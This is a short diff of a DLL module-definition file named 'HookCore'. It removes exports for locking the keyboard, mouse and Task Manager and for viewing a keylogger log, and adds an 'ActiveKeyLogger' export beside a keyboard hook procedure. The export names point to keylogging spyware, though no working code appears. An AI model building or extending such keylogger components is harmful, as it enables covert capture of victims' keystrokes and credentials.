@@ -1,7 +1,4 @@
 LIBRARY	"HookCore"
 EXPORTS
-   LockKeyboard
-   LockTaskManager
-   LockMouse
-   ViewLogKeyLogger
+   ActiveKeyLogger
    KeyLoggerHookProc
